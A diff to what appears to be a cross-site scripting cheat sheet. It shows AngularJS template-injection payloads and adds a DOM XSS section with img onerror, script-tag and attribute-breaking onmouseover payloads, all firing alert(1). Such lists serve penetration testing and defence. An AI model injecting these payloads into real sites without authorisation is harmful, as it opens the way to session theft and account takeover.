@@ -28,3 +28,20 @@ Rendered output
 {{$eval.constructor('alert(1)')()}}
 
 {{[].filter.constructor('alert(1)')()}}
+
+4. Reflected DOM XSS
+
+HTML injection via DOM sink (innerHTML)
+<img src=x onerror=alert(1)>
+
+
+✔ Works when user input is written directly to the DOM.
+
+2️⃣ Script tag injection (if not filtered)
+<script>alert(1)</script>
+
+
+✔ Classic DOM XSS (often blocked, but still tested)
+
+3️⃣ Attribute-based DOM XSS
+" onmouseover="alert(1)
